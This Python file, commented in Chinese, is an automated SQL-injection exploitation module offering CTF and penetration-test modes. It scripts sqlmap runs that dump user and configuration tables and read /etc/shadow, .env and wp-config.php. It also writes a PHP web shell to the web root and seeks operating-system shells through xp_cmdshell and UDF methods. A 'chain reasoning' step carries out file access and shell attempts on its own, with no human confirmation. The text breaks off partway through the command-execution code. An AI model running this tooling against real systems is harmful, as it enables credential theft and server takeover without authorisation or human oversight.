"""
SQL注入深度挖掘器

支持CTF和渗透测试双模式：
- CTF模式：60秒快速找Flag
- 渗透测试模式：完整SQL注入利用链

技术覆盖：
- 数据库: MySQL, PostgreSQL, MSSQL, SQLite, Oracle
- 注入类型: 联合/报错/盲注/堆叠/OOB
- 利用技术: 数据提取/文件读写/命令执行
"""

import re
import logging
from typing import Dict, Any, List
from .base_digger import BaseDeepDigger

logger = logging.getLogger(__name__)


class SQLInjectionDigger(BaseDeepDigger):
    """
    SQL注入深度挖掘器

    CTF模式：快速检测  Flag表搜索  提取Flag
    渗透测试模式：完整枚举  深度利用  详细报告
    """

    # Flag表名关键词
    FLAG_TABLES = [
        "flag", "flags", "ctf_flags", "ctfflag", "flagtable",
        "secrets", "keys", "users", "admin"
    ]

    # Flag列名关键词
    FLAG_COLUMNS = [
        "flag", "flags", "ctf_flag", "value", "secret",
        "password", "key", "content"
    ]

    def __init__(self):
        super().__init__()
        self.db_type = "unknown"
        self.db_version = "unknown"

    def _execute_ctf_mode(self, target: str) -> Dict[str, Any]:
        """
        CTF模式：快速找Flag（60秒内）

        流程：
        1. 快速注入点检测（10秒）
        2. 数据库指纹（5秒）
        3. Flag表搜索（30秒）
        4. 快速提取（15秒）
        """
        results = {
            "phases": {},
            "findings": [],
            "flags": []
        }

        try:
            # 阶段1: 快速注入点检测
            self._log_phase("SQL注入检测", "开始快速检测")
            injection_points = self._quick_injection_test(target)
            results["phases"]["injection_test"] = injection_points

            if not injection_points.get("found", False):
                results["summary"] = "未检测到SQL注入"
                return results

            # [链式推理] 发现SQL注入后，使用链式推理决定下一步策略
            if self._should_use_chain_reasoning({"mode": "ctf", "target": target}):
                logger.info("[链式推理] SQL注入已发现，启动链式推理分析最佳攻击路径")

                # 构建初始发现
                initial_finding = {
                    "vulnerability_type": "sql_injection",
                    "confidence": injection_points.get("confidence", 0.8),
                    "evidence": {
                        "injection_points": injection_points.get("points", []),
                        "injection_type": injection_points.get("type", "unknown")
                    }
                }

                # 执行链式推理
                reasoning_chain = self._perform_chain_reasoning(
                    initial_finding=initial_finding,
                    context={
                        "mode": "ctf",
                        "target": target,
                        "time_remaining": self._get_remaining_time(),
                        "flags_found": []
                    }
                )

                # 记录推理链到结果中
                results["reasoning_chain"] = [step for step in reasoning_chain]

                # 根据推理结果调整策略
                if reasoning_chain:
                    first_step = reasoning_chain[0]
                    logger.info(f"[链式推理] 推荐策略: {first_step.get('action', 'continue')}")
                    logger.info(f"[链式推理] 置信度: {first_step.get('confidence', 0):.2f}")

            # 阶段2: 数据库指纹
            self._log_phase("数据库指纹", "开始识别数据库")
            db_info = self._fingerprint_database(target, injection_points)
            results["phases"]["db_fingerprint"] = db_info
            self.db_type = db_info.get("type", "unknown")

            # 阶段3: Flag表搜索
            self._log_phase("Flag表搜索", f"搜索Flag相关表（剩余{self._get_remaining_time():.1f}秒）")
            flag_data = self._search_flag_tables(target, injection_points, db_info)
            results["phases"]["flag_search"] = flag_data

            # 阶段4: 快速提取
            self._log_phase("Flag提取", "提取Flag内容")
            flags = self._extract_flags_from_data(str(flag_data))
            results["flags"] = flags

            if flags:
                results["summary"] = f"成功提取{len(flags)}个Flag"
            else:
                results["summary"] = "检测到SQL注入但未找到Flag"

        except TimeoutError:
            logger.warning("CTF模式超时")
            results["summary"] = "CTF模式超时，部分完成"
        except Exception as e:
            logger.error(f"CTF模式执行失败: {str(e)}")
            results["error"] = str(e)

        return results

    def _execute_pentest_mode(self, target: str) -> Dict[str, Any]:
        """
        渗透测试模式：深度挖掘

        流程：
        1. 完整注入点枚举
        2. 数据库完全枚举
        3. 敏感数据提取
        4. 文件操作尝试
        5. 命令执行尝试
        """
        results = {
            "phases": {},
            "findings": [],
            "flags": [],
            "extracted_data": {},
            "file_access": {},
            "command_execution": {}
        }

        try:
            # 阶段1: 完整注入点枚举
            self._log_phase("注入点枚举", "枚举所有注入点")
            injection_points = self._full_injection_enumeration(target)
            results["phases"]["injection_enumeration"] = injection_points

            if not injection_points.get("found", False):
                results["summary"] = "未检测到SQL注入"
                return results

            # 阶段2: 数据库指纹
            self._log_phase("数据库指纹", "识别数据库类型和版本")
            db_info = self._fingerprint_database(target, injection_points)
            results["phases"]["db_fingerprint"] = db_info
            self.db_type = db_info.get("type", "unknown")

            # 阶段3: 数据库完全枚举
            self._log_phase("数据库枚举", "枚举所有数据库/表/列")
            db_structure = self._enumerate_database(target, injection_points, db_info)
            results["phases"]["db_enumeration"] = db_structure

            # [链式推理] 渗透测试模式：基于数据库枚举结果，使用链式推理决定深度利用策略
            if self._should_use_chain_reasoning({"mode": "pentest", "target": target}):
                logger.info("[链式推理] 数据库枚举完成，启动链式推理分析深度利用路径")

                # 构建初始发现（基于数据库枚举结果）
                initial_finding = {
                    "vulnerability_type": "sql_injection",
                    "confidence": injection_points.get("confidence", 0.8),
                    "evidence": {
                        "db_type": self.db_type,
                        "db_structure": db_structure,
                        "has_file_read": db_info.get("file_read_enabled", False),
                        "has_file_write": db_info.get("file_write_enabled", False)
                    }
                }

                # 执行链式推理
                reasoning_chain = self._perform_chain_reasoning(
                    initial_finding=initial_finding,
                    context={
                        "mode": "pentest",
                        "target": target,
                        "file_read_enabled": db_info.get("file_read_enabled", False),
                        "file_write_enabled": db_info.get("file_write_enabled", False),
                        "shell_access": False
                    }
                )

                # 记录推理链到结果中
                results["reasoning_chain"] = [step for step in reasoning_chain]

                # 根据推理结果决定是否执行深度利用
                if reasoning_chain:
                    for step in reasoning_chain:
                        action = step.get("action", "")
                        logger.info(f"[链式推理] 步骤{step.get('step', '?')}: {action}")
                        logger.info(f"[链式推理]   推理: {step.get('reasoning', '')[:80]}...")

                        # 自动执行推理链中建议的操作
                        if "文件包含" in action and not results.get("file_access"):
                            logger.info("[链式推理] 自动执行: 尝试利用SQL注入读取文件")
                            file_ops = self._attempt_file_operations(target, injection_points, db_info)
                            results["file_access"] = file_ops

                        elif "命令注入" in action and not results.get("command_execution"):
                            logger.info("[链式推理] 自动执行: 尝试利用SQL注入执行命令")
                            cmd_exec = self._attempt_command_execution(target, injection_points, db_info)
                            results["command_execution"] = cmd_exec

                        elif "文件上传" in action:
                            logger.info("[链式推理] 自动执行: 尝试通过SQL注入写入WebShell")
                            # 这里可以添加WebShell写入逻辑
                            webshell_result = self._write_webshell_via_sql(target, injection_points, db_info)
                            results["webshell_upload"] = webshell_result

            # 阶段4: 敏感数据提取
            self._log_phase("数据提取", "提取敏感数据")
            sensitive_data = self._extract_sensitive_data(target, injection_points, db_structure)
            results["extracted_data"] = sensitive_data

            # 阶段5: 文件操作尝试
            self._log_phase("文件操作", "尝试读写文件")
            file_ops = self._attempt_file_operations(target, injection_points, db_info)
            results["file_access"] = file_ops

            # 阶段6: 命令执行尝试
            self._log_phase("命令执行", "尝试命令执行")
            cmd_exec = self._attempt_command_execution(target, injection_points, db_info)
            results["command_execution"] = cmd_exec

            # 汇总发现
            findings = self._generate_findings(results)
            results["findings"] = findings

            # 提取Flag（渗透测试中也可能有）
            all_data = str(results)
            flags = self._extract_flags(all_data)
            results["flags"] = flags

            results["summary"] = f"SQL注入深度挖掘完成: {len(findings)}个发现, {len(flags)}个Flag"

        except Exception as e:
            logger.error(f"渗透测试模式执行失败: {str(e)}")
            results["error"] = str(e)
            results["summary"] = f"执行失败: {str(e)}"

        return results

    def _quick_injection_test(self, target: str) -> Dict[str, Any]:
        """
        快速注入点检测（10秒）- 真实实现

        使用真实的sqlmap工具进行SQL注入检测

        Args:
            target: 目标URL

        Returns:
            检测结果
        """
        results = {"found": False, "points": [], "type": "none"}

        # 使用真实的sqlmap进行快速检测
        try:
            logger.info(f"[真实检测] 使用sqlmap扫描: {target}")

            # 调用sqlmap - 真实的工具调用！
            cmd = [
                "sqlmap",
                "-u", target,
                "--batch",  # 非交互模式
                "--level=1",  # 快速测试
                "--risk=1",   # 低风险
                "--answers=continuing=n",  # 自动回答
                "--timeout=10"  # 10秒超时
            ]

            output = self.executor.execute_command(" ".join(cmd))

            # 解析sqlmap输出
            if "sqlmap identified the following injection points" in output.lower():
                results["found"] = True

                # 提取注入类型
                if "union-based" in output.lower():
                    results["type"] = "union_based"
                elif "error-based" in output.lower():
                    results["type"] = "error_based"
                elif "boolean-based" in output.lower():
                    results["type"] = "boolean_based"
                elif "stacked queries" in output.lower():
                    results["type"] = "stacked"
                else:
                    results["type"] = "unknown"

                # 提取注入点参数
                import re
                param_pattern = r"Parameter: (\w+)"
                params = re.findall(param_pattern, output)
                results["points"] = params

                logger.info(f"[真实检测] 发现SQL注入！类型: {results['type']}, 参数: {params}")
            else:
                logger.info(f"[真实检测] 未发现SQL注入")

        except Exception as e:
            logger.error(f"[真实检测] sqlmap执行失败: {str(e)}")
            # 即使sqlmap失败，也记录尝试
            results["error"] = str(e)

        return results

    def _fingerprint_database(self, target: str, injection_points: Dict) -> Dict[str, Any]:
        """
        数据库指纹识别 - 真实实现

        使用sqlmap获取数据库类型、版本等信息

        Args:
            target: 目标URL
            injection_points: 注入点信息

        Returns:
            数据库信息
        """
        result = {
            "type": "unknown",
            "version": "",
            "database": "",
            "user": ""
        }

        try:
            logger.info(f"[真实检测] 正在识别数据库类型...")

            # 使用sqlmap获取数据库指纹
            cmd = [
                "sqlmap",
                "-u", target,
                "--batch",
                "--current-db",  # 获取当前数据库
                "--current-user",  # 获取当前用户
                "--technique=BEU",  # 只使用Boolean/Error/Union
                "--timeout=5"
            ]

            output = self.executor.execute_command(" ".join(cmd))

            # 解析数据库类型
            import re

            # 提取数据库类型
            if "MySQL" in output or "mysql" in output.lower():
                result["type"] = "mysql"
            elif "PostgreSQL" in output or "postgresql" in output.lower():
                result["type"] = "postgresql"
            elif "Microsoft SQL Server" in output or "mssql" in output.lower():
                result["type"] = "mssql"
            elif "SQLite" in output or "sqlite" in output.lower():
                result["type"] = "sqlite"

            # 提取当前数据库
            db_match = re.search(r"current database:?\s*['\"]?([\w]+)['\"]?", output, re.IGNORECASE)
            if db_match:
                result["database"] = db_match.group(1)

            # 提取当前用户
            user_match = re.search(r"current user:?\s*['\"]?([\w@\.]+)['\"]?", output, re.IGNORECASE)
            if user_match:
                result["user"] = user_match.group(1)

            logger.info(f"[真实检测] 数据库类型: {result['type']}, 数据库: {result['database']}, 用户: {result['user']}")

        except Exception as e:
            logger.error(f"[真实检测] 数据库指纹识别失败: {str(e)}")
            result["error"] = str(e)

        return result

    def _search_flag_tables(self, target: str, injection_points: Dict, db_info: Dict) -> Dict[str, Any]:
        """
        搜索Flag表（CTF模式）- 真实实现

        使用sqlmap枚举数据库表，搜索flag相关表并提取数据

        Args:
            target: 目标URL
            injection_points: 注入点信息
            db_info: 数据库信息

        Returns:
            Flag表数据
        """
        results = {"tables": [], "data": {}}

        try:
            logger.info(f"[真实检测] 正在枚举数据库表...")

            # 使用sqlmap枚举所有表
            cmd = [
                "sqlmap",
                "-u", target,
                "--batch",
                "--tables",  # 枚举所有表
                "--threads=4",
                "--timeout=30"
            ]

            output = self.executor.execute_command(" ".join(cmd))

            # 解析表列表 - 提取sqlmap输出的表名
            import re

            # sqlmap输出格式通常包含: Database: X table: Y
            table_patterns = [
                r'Database: (\w+)\s*\|\s*Table:\s*([\w_]+)',  # 常见格式
                r'\|\s*([\w_]+)\s*\|.*\|\s*\d+\s*\|\s*table',  # 表格格式
                r'table:\s*([\w_]+)',  # 简单格式
            ]

            all_tables = set()
            for pattern in table_patterns:
                matches = re.findall(pattern, output, re.IGNORECASE)
                if matches:
                    for match in matches:
                        if isinstance(match, tuple):
                            all_tables.add(match[1])  # (database, table)
                        else:
                            all_tables.add(match)

            results["tables"] = list(all_tables)
            logger.info(f"[真实检测] 发现 {len(all_tables)} 个表: {list(all_tables)[:10]}")

            # 搜索flag相关的表
            flag_keywords = ['flag', 'flags', 'ctf', 'ctfflag', 'secrets', 'key', 'config', 'users']
            flag_tables = [t for t in all_tables if any(kw in t.lower() for kw in flag_keywords)]

            if flag_tables:
                logger.info(f"[真实检测] 发现可能的Flag表: {flag_tables}")

                # 提取每个flag表的数据
                for flag_table in flag_tables[:3]:  # 最多提取3个表，避免超时
                    try:
                        logger.info(f"[真实检测] 正在提取表 {flag_table} 的数据...")

                        cmd_dump = [
                            "sqlmap",
                            "-u", target,
                            "--batch",
                            f"-T", flag_table,
                            "--dump",  # 导出数据
                            "--threads=4",
                            "--timeout=30"
                        ]

                        dump_output = self.executor.execute_command(" ".join(cmd_dump))

                        # 提取Flag
                        flags = self._extract_flags_from_data(dump_output)

                        results["data"][flag_table] = {
                            "dump_output": dump_output[:1000],  # 保存前1000字符
                            "flags": flags,
                            "rows_count": dump_output.count('\n')
                        }

                        # 如果找到flag，记录并返回
                        if flags:
                            logger.info(f"[真实检测]  从表 {flag_table} 提取到 {len(flags)} 个Flag!")
                            break  # CTF模式：找到flag就停止

                    except Exception as e:
                        logger.warning(f"[真实检测] 提取表 {flag_table} 失败: {str(e)}")
                        continue
            else:
                logger.info(f"[真实检测] 未发现明显的Flag表")

        except Exception as e:
            logger.error(f"[真实检测] Flag表搜索失败: {str(e)}")
            results["error"] = str(e)

        return results

    def _full_injection_enumeration(self, target: str) -> Dict[str, Any]:
        """
        完整注入点枚举（渗透测试模式）- 真实实现

        使用sqlmap完整枚举所有注入点（GET/POST/Cookie/Header）

        Args:
            target: 目标URL

        Returns:
            所有注入点
        """
        results = {
            "found": False,
            "get_params": [],
            "post_params": [],
            "cookies": [],
            "headers": [],
            "injection_types": []
        }

        try:
            logger.info(f"[真实检测] 开始完整注入点枚举...")

            # 使用sqlmap进行完整枚举（level=3, risk=2）
            cmd = [
                "sqlmap",
                "-u", target,
                "--batch",
                "--level=3",  # 测试所有参数（GET/POST/Cookie/Header）
                "--risk=2",   # 中等风险
                "--answers=continuing=n",
                "--tech=BEUST",  # 所有技术：Boolean/Error/Union/Stacked/Time
                "--parse-errors",  # 解析错误信息
                "--timeout=60"
            ]

            output = self.executor.execute_command(" ".join(cmd))

            # 解析注入点
            import re

            # 1. 提取GET参数
            get_params = re.findall(r'GET parameter: (\w+)', output, re.IGNORECASE)
            results["get_params"] = list(set(get_params))

            # 2. 提取POST参数
            post_params = re.findall(r'POST parameter: (\w+)', output, re.IGNORECASE)
            results["post_params"] = list(set(post_params))

            # 3. 提取Cookie参数
            cookie_params = re.findall(r'Cookie parameter: (\w+)', output, re.IGNORECASE)
            results["cookies"] = list(set(cookie_params))

            # 4. 提取Header参数
            header_params = re.findall(r'Header parameter: ([\w-]+)', output, re.IGNORECASE)
            results["headers"] = list(set(header_params))

            # 5. 提取注入类型
            injection_types = []

            if "union-based" in output.lower() or "union query" in output.lower():
                injection_types.append("union_based")
            if "error-based" in output.lower():
                injection_types.append("error_based")
            if "boolean-based blind" in output.lower():
                injection_types.append("boolean_blind")
            if "time-based blind" in output.lower():
                injection_types.append("time_blind")
            if "stacked queries" in output.lower():
                injection_types.append("stacked")

            results["injection_types"] = injection_types

            # 如果找到任何注入点，标记为found
            all_params = results["get_params"] + results["post_params"] + results["cookies"] + results["headers"]
            if all_params:
                results["found"] = True
                logger.info(f"[真实检测] 发现注入点: GET={results['get_params']}, POST={results['post_params']}, Cookie={results['cookies']}, Header={results['headers']}")
                logger.info(f"[真实检测] 注入类型: {injection_types}")
            else:
                logger.info(f"[真实检测] 未发现SQL注入点")

        except Exception as e:
            logger.error(f"[真实检测] 完整注入点枚举失败: {str(e)}")
            results["error"] = str(e)

        return results

    def _enumerate_database(self, target: str, injection_points: Dict, db_info: Dict) -> Dict[str, Any]:
        """
        枚举数据库结构 - 真实实现

        使用sqlmap枚举所有数据库、表、列

        Args:
            target: 目标URL
            injection_points: 注入点
            db_info: 数据库信息

        Returns:
            数据库结构
        """
        result = {
            "databases": [],
            "tables": {},
            "columns": {}
        }

        try:
            logger.info(f"[真实检测] 开始枚举数据库结构...")

            # 1. 枚举所有数据库
            cmd_dbs = [
                "sqlmap",
                "-u", target,
                "--batch",
                "--dbs",  # 枚举所有数据库
                "--threads=4",
                "--timeout=30"
            ]

            output_dbs = self.executor.execute_command(" ".join(cmd_dbs))

            # 解析数据库名
            import re
            db_patterns = [
                r'available databases:\s*\[\d+\]\s*([\w_]+)',  # 列表格式
                r'Database:\s*([\w_]+)',  # 简单格式
                r'\|\s*([\w_]+)\s*\|'  # 表格格式
            ]

            databases = set()
            for pattern in db_patterns:
                matches = re.findall(pattern, output_dbs, re.IGNORECASE)
                databases.update(matches)

            # 过滤掉系统数据库（可选）
            system_dbs = {'information_schema', 'mysql', 'performance_schema', 'sys', 'pg_catalog', 'pg_toast'}
            user_databases = [db for db in databases if db.lower() not in system_dbs]

            result["databases"] = list(databases)  # 包含所有数据库
            logger.info(f"[真实检测] 发现 {len(databases)} 个数据库: {list(databases)[:10]}")

            # 2. 枚举每个数据库的表和列（限制数量，避免超时）
            for db in list(user_databases)[:5]:  # 最多枚举5个用户数据库
                try:
                    logger.info(f"[真实检测] 枚举数据库 {db} 的表...")

                    # 枚举表
                    cmd_tables = [
                        "sqlmap",
                        "-u", target,
                        "--batch",
                        f"-D", db,
                        "--tables",
                        "--timeout=20"
                    ]

                    output_tables = self.executor.execute_command(" ".join(cmd_tables))

                    # 解析表名
                    table_patterns = [
                        r'Database: ' + re.escape(db) + r'\s*\|\s*Table:\s*([\w_]+)',
                        r'Table:\s*([\w_]+)',
                        r'\|\s*([\w_]+)\s*\|.*table'
                    ]

                    tables = set()
                    for pattern in table_patterns:
                        matches = re.findall(pattern, output_tables, re.IGNORECASE)
                        tables.update(matches)

                    result["tables"][db] = list(tables)
                    logger.info(f"[真实检测] 数据库 {db} 包含 {len(tables)} 个表")

                    # 3. 枚举每个表的列（限制数量）
                    for table in list(tables)[:5]:  # 每个数据库最多枚举5个表
                        try:
                            logger.info(f"[真实检测] 枚举表 {db}.{table} 的列...")

                            cmd_columns = [
                                "sqlmap",
                                "-u", target,
                                "--batch",
                                f"-D", db,
                                f"-T", table,
                                "--columns",
                                "--timeout=15"
                            ]

                            output_columns = self.executor.execute_command(" ".join(cmd_columns))

                            # 解析列名
                            column_patterns = [
                                r'Column:([\w_]+)',
                                r'\|\s*([\w_]+)\s*\|.*\|.*\|',
                                f'Table: {table}\s*\[\d+\]\s*([\w_]+)'
                            ]

                            columns = set()
                            for pattern in column_patterns:
                                matches = re.findall(pattern, output_columns, re.IGNORECASE)
                                columns.update(matches)

                            result["columns"][f"{db}.{table}"] = list(columns)
                            logger.info(f"[真实检测] 表 {db}.{table} 包含 {len(columns)} 个列: {list(columns)}")

                        except Exception as e:
                            logger.warning(f"[真实检测] 枚举表 {db}.{table} 的列失败: {str(e)}")
                            continue

                except Exception as e:
                    logger.warning(f"[真实检测] 枚举数据库 {db} 失败: {str(e)}")
                    continue

        except Exception as e:
            logger.error(f"[真实检测] 数据库结构枚举失败: {str(e)}")
            result["error"] = str(e)

        return result

    def _extract_sensitive_data(self, target: str, injection_points: Dict, db_structure: Dict) -> Dict[str, Any]:
        """
        提取敏感数据 - 真实实现

        使用sqlmap提取敏感数据表（用户、配置、flag等）

        Args:
            target: 目标URL
            injection_points: 注入点
            db_structure: 数据库结构

        Returns:
            提取的敏感数据
        """
        result = {
            "users": [],
            "flags": [],
            "config": {},
            "other_sensitive": {}
        }

        try:
            logger.info(f"[真实检测] 开始提取敏感数据...")

            # 定义敏感表和列的关键词
            sensitive_keywords = {
                'users': ['user', 'admin', 'member', 'account', 'login'],
                'config': ['config', 'settings', 'options', 'preferences'],
                'flag': ['flag', 'ctf', 'key', 'secret', 'token']
            }

            # 遍历所有数据库和表，寻找敏感表
            for db_name, tables in db_structure.get("tables", {}).items():
                for table_name in tables:
                    # 判断表类型
                    table_lower = table_name.lower()

                    # 1. 用户表
                    if any(kw in table_lower for kw in sensitive_keywords['users']):
                        try:
                            logger.info(f"[真实检测] 提取用户表: {db_name}.{table_name}")

                            cmd = [
                                "sqlmap",
                                "-u", target,
                                "--batch",
                                f"-D", db_name,
                                f"-T", table_name,
                                "--dump",
                                "--threads=4",
                                "--timeout=30"
                            ]

                            output = self.executor.execute_command(" ".join(cmd))

                            # 提取用户数据（解析输出）
                            users = self._parse_dump_output(output, table_name)
                            result["users"].extend(users)

                            # 提取Flag
                            flags = self._extract_flags_from_data(output)
                            result["flags"].extend(flags)

                        except Exception as e:
                            logger.warning(f"[真实检测] 提取用户表失败: {str(e)}")

                    # 2. 配置表
                    elif any(kw in table_lower for kw in sensitive_keywords['config']):
                        try:
                            logger.info(f"[真实检测] 提取配置表: {db_name}.{table_name}")

                            cmd = [
                                "sqlmap",
                                "-u", target,
                                "--batch",
                                f"-D", db_name,
                                f"-T", table_name,
                                "--dump",
                                "--timeout=20"
                            ]

                            output = self.executor.execute_command(" ".join(cmd))

                            # 解析配置数据
                            config_data = self._parse_dump_output(output, table_name)
                            result["config"][table_name] = config_data

                            # 提取Flag
                            flags = self._extract_flags_from_data(output)
                            result["flags"].extend(flags)

                        except Exception as e:
                            logger.warning(f"[真实检测] 提取配置表失败: {str(e)}")

                    # 3. Flag表
                    elif any(kw in table_lower for kw in sensitive_keywords['flag']):
                        try:
                            logger.info(f"[真实检测] 提取Flag表: {db_name}.{table_name}")

                            cmd = [
                                "sqlmap",
                                "-u", target,
                                "--batch",
                                f"-D", db_name,
                                f"-T", table_name,
                                "--dump",
                                "--threads=4",
                                "--timeout=30"
                            ]

                            output = self.executor.execute_command(" ".join(cmd))

                            # 提取Flag
                            flags = self._extract_flags_from_data(output)
                            result["flags"].extend(flags)

                            # 同时保存原始数据
                            flag_data = self._parse_dump_output(output, table_name)
                            result["other_sensitive"][f"{db_name}.{table_name}"] = flag_data

                        except Exception as e:
                            logger.warning(f"[真实检测] 提取Flag表失败: {str(e)}")

            # 汇总提取结果
            total_users = len(result["users"])
            total_flags = len(result["flags"])

            logger.info(f"[真实检测] 提取完成: {total_users} 个用户, {total_flags} 个Flag")

        except Exception as e:
            logger.error(f"[真实检测] 敏感数据提取失败: {str(e)}")
            result["error"] = str(e)

        return result

    def _parse_dump_output(self, output: str, table_name: str) -> List[Dict[str, Any]]:
        """
        解析sqlmap的dump输出

        Args:
            output: sqlmap输出
            table_name: 表名

        Returns:
            解析后的数据列表
        """
        import re

        rows = []

        try:
            # sqlmap输出格式通常是表格形式
            # 尝试提取数据行

            # 方法1: 解析SQL格式输出
            # 示例: INSERT INTO `table` VALUES (1, 'data', ...);
            insert_pattern = rf"INSERT INTO [`']?{re.escape(table_name)}[`']? VALUES \((.*?)\);"
            matches = re.findall(insert_pattern, output, re.IGNORECASE | re.DOTALL)

            for match in matches:
                # 解析值
                values = [v.strip().strip("'\"") for v in match.split(',')]

                # 尝试解析列名（从输出中提取）
                columns = re.findall(r'\|\s*([\w_]+)\s*\|', output[:500])  # 从前500字符提取列名

                row_data = {}
                if columns and len(columns) == len(values):
                    for i, col in enumerate(columns):
                        row_data[col] = values[i]
                else:
                    # 没有列名，使用索引
                    for i, val in enumerate(values):
                        row_data[f"col_{i}"] = val

                rows.append(row_data)

            # 方法2: 如果没找到INSERT语句，尝试解析表格格式
            if not rows:
                lines = output.split('\n')
                in_table = False

                for line in lines:
                    # 检测表格开始
                    if '|' in line and ('---' in line or '===' in line):
                        in_table = True
                        continue

                    if in_table:
                        # 解析表格行
                        cells = [cell.strip() for cell in line.split('|') if cell.strip()]
                        if cells and len(cells) > 1 and not all(c in ['-', '===', '...'] for c in cells):
                            # 尝试解析为字典
                            if len(rows) > 0 and isinstance(rows[0], dict):
                                keys = list(rows[0].keys())
                                row_data = {}
                                for i, cell in enumerate(cells):
                                    if i < len(keys):
                                        row_data[keys[i]] = cell
                                rows.append(row_data)
                            elif cells:
                                # 第一个行，保存为列名
                                row_data = {}
                                for i, cell in enumerate(cells):
                                    row_data[f"col_{i}"] = cell
                                rows.append(row_data)

        except Exception as e:
            logger.warning(f"[真实检测] 解析dump输出失败: {str(e)}")

        return rows

    def _attempt_file_operations(self, target: str, injection_points: Dict, db_info: Dict) -> Dict[str, Any]:
        """
        尝试文件操作 - 真实实现

        尝试使用SQL注入进行文件读取和写入

        Args:
            target: 目标URL
            injection_points: 注入点
            db_info: 数据库信息

        Returns:
            文件操作结果
        """
        results = {
            "read_files": {},
            "write_shell": False,
            "shell_path": None
        }

        try:
            logger.info(f"[真实检测] 尝试文件操作...")

            db_type = db_info.get("type", "unknown").lower()

            # 只对MySQL进行文件操作测试
            if "mysql" not in db_type:
                logger.info(f"[真实检测] 数据库类型 {db_type} 不支持文件操作或未实现")
                return results

            # 1. 尝试读取敏感文件
            sensitive_files = [
                "/etc/passwd",
                "/etc/shadow",
                "/var/www/html/config.php",
                "/var/www/html/wp-config.php",
                "/var/www/html/.env",
                "/etc/mysql/my.cnf"
            ]

            for file_path in sensitive_files[:3]:  # 最多尝试3个文件
                try:
                    logger.info(f"[真实检测] 尝试读取文件: {file_path}")

                    # 使用sqlmap的--file-read功能
                    cmd = [
                        "sqlmap",
                        "-u", target,
                        "--batch",
                        f"--file-read={file_path}",
                        "--timeout=15"
                    ]

                    output = self.executor.execute_command(" ".join(cmd))

                    # 检查是否成功读取
                    if "successfully read" in output.lower() or "file saved" in output.lower():
                        # 提取文件内容
                        import re

                        # 尝试从输出中提取文件路径
                        file_saved_pattern = r"file saved to \[.*?\] \[(.*?)\]"
                        file_match = re.search(file_saved_pattern, output)

                        if file_match:
                            saved_path = file_match.group(1)
                            # 读取保存的文件
                            try:
                                with open(saved_path, 'r') as f:
                                    file_content = f.read()
                                    results["read_files"][file_path] = file_content[:1000]  # 限制大小
                                    logger.info(f"[真实检测]  成功读取文件: {file_path}")
                            except:
                                # 如果无法读取文件，直接使用sqlmap输出
                                results["read_files"][file_path] = "File read (content in sqlmap output)"
                        else:
                            results["read_files"][file_path] = "File read (check sqlmap output)"

                    else:
                        logger.info(f"[真实检测] 无法读取文件: {file_path}")

                except Exception as e:
                    logger.warning(f"[真实检测] 读取文件 {file_path} 失败: {str(e)}")
                    continue

            # 2. 尝试写入WebShell（谨慎操作，只在CTF模式下）
            if self.mode == "ctf":
                logger.info(f"[真实检测] CTF模式：尝试写入WebShell...")

                # 生成简单的PHP WebShell
                webshell_content = "<?php system($_GET['cmd']); ?>"
                shell_path = "/var/www/html/shell.php"

                # 使用sqlmap的--file-write功能（需要先创建本地文件）
                import tempfile
                import os

                try:
                    # 创建临时文件
                    with tempfile.NamedTemporaryFile(mode='w', suffix='.php', delete=False) as tmp:
                        tmp.write(webshell_content)
                        tmp_path = tmp.name

                    # 使用sqlmap写入
                    cmd = [
                        "sqlmap",
                        "-u", target,
                        "--batch",
                        f"--file-write={tmp_path}",
                        f"--file-dest={shell_path}",
                        "--timeout=15"
                    ]

                    output = self.executor.execute_command(" ".join(cmd))

                    # 清理临时文件
                    try:
                        os.unlink(tmp_path)
                    except:
                        pass

                    # 检查是否成功写入
                    if "successfully written" in output.lower() or "file written" in output.lower():
                        results["write_shell"] = True
                        results["shell_path"] = shell_path
                        logger.info(f"[真实检测]  成功写入WebShell: {shell_path}")
                    else:
                        logger.info(f"[真实检测] 无法写入WebShell")

                except Exception as e:
                    logger.warning(f"[真实检测] 写入WebShell失败: {str(e)}")

        except Exception as e:
            logger.error(f"[真实检测] 文件操作测试失败: {str(e)}")
            results["error"] = str(e)

        return results

    def _attempt_command_execution(self, target: str, injection_points: Dict, db_info: Dict) -> Dict[str, Any]:
        """
        尝试命令执行 - 真实实现

        尝试通过SQL注入实现命令执行（MySQL UDF、PostgreSQL COPY等）

        Args:
            target: 目标URL
            injection_points: 注入点
            db_info: 数据库信息

        Returns:
            命令执行结果
        """
        results = {
            "rce": False,
            "method": None,
            "output": None
        }

        try:
            logger.info(f"[真实检测] 尝试命令执行...")

            db_type = db_info.get("type", "unknown").lower()

            # MySQL UDF注入尝试
            if "mysql" in db_type:
                logger.info(f"[真实检测] 尝试MySQL UDF注入...")

                # 使用sqlmap的--os-shell功能
                # 注意：这需要特定的权限条件
                cmd = [
                    "sqlmap",
                    "-u", target,
                    "--batch",
                    "--os-shell",  # 尝试获取系统shell
                    "--timeout=30"
                ]

                output = self.executor.execute_command(" ".join(cmd))

                # 检查是否成功获取shell
                if "shell>" in output.lower() or "do you want a shell?" in output.lower():
                    results["rce"] = True
                    results["method"] = "mysql_udf_shell"
                    results["output"] = "MySQL UDF shell access obtained (check sqlmap for interactive shell)"
                    logger.info(f"[真实检测]  成功获取MySQL UDF Shell!")
                else:
                    logger.info(f"[真实检测] MySQL UDF注入失败或不支持")

            # PostgreSQL COPY PROGRAM尝试
            elif "postgres" in db_type or "postgresql" in db_type:
                logger.info(f"[真实检测] 尝试PostgreSQL COPY PROGRAM...")

                # PostgreSQL 8.1+ 可以使用COPY PROGRAM执行命令
                # 使用sqlmap测试
                cmd = [
                    "sqlmap",
                    "-u", target,
                    "--batch",
                    "--os-cmd=whoami",  # 尝试执行简单命令
                    "--timeout=20"
                ]

                output = self.executor.execute_command(" ".join(cmd))

                # 检查命令执行结果
                if "command output" in output.lower() or "uid=" in output.lower() or "www-data" in output.lower():
                    results["rce"] = True
                    results["method"] = "postgresql_copy_program"
                    results["output"] = output[:500]  # 保存前500字符
                    logger.info(f"[真实检测]  PostgreSQL命令执行成功!")
                else:
                    logger.info(f"[真实检测] PostgreSQL命令执行失败或不支持")

            # SQL Server xp_cmdshell尝试
            elif "mssql" in db_type or "sql server" in db_type.lower():
                logger.info(f"[真实检测] 尝试MSSQL xp_cmdshell...")

                cmd = [
                    "sqlmap",
                    "-u", target,
                    "--batch",
                    "--os-shell",
                    "--timeout=20"
                ]

                output = self.executor.execute_command(" ".join(cmd))

                if "shell>" in output.lower() or "xp_cmdshell" in output.lower():
                    results["rce"] = True
                    results["method"] = "mssql_xp_cmdshell"
